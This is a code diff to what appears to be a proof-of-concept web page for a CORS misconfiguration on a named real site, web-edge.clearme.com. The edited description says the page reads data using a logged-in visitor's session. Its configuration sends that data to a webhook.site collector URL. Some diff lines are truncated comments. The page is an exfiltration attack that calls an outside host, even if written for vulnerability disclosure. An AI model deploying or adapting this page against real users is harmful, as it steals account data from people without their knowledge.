@@ -12,9 +12,9 @@
   <body>
 
   <h2>CORS Exfiltration Proof of Concept</h2>
-  <p>This page demonstrates that <code>web-edge.clearme.com</code>
-  reflects the Origin header and allows credentials – no Clearme account
-  is required to see the vulnerability.</p>
+  <p>If you are logged into Clearme, this page will try to read data from
+     <code>https://web-edge.clearme.com/</code> and send it to your
+  webhook collector.</p>
 
   <pre id="log"></pre>
 
@@ -22,11 +22,9 @@
     /* --------------------------------------------------------------
        Configuration – edit only these two lines if needed
        -------------------------------------------------------------- */
-    var TARGET_URL   = 'https://web-edge.clearme.com/';          // 
-  endpoint to test
+    var TARGET_URL   = 'https://web-edge.clearme.com/';          //
     var COLLECTOR    =
-  'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // <-- YOUR
-  webhook URL
+  'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // <-- YOU
     /* -------------------------------------------------------------- */
 
     /* --------------------------------------------------------------
@@ -80,7 +78,6 @@
     .catch(function(err) {
       log('[-] Error: ' + err);
       // Even if something went wrong, we still show that the browser 
-  allowed the request
       log('Nevertheless, the browser permitted the cross‑origin request 
   with credentials.');
     });
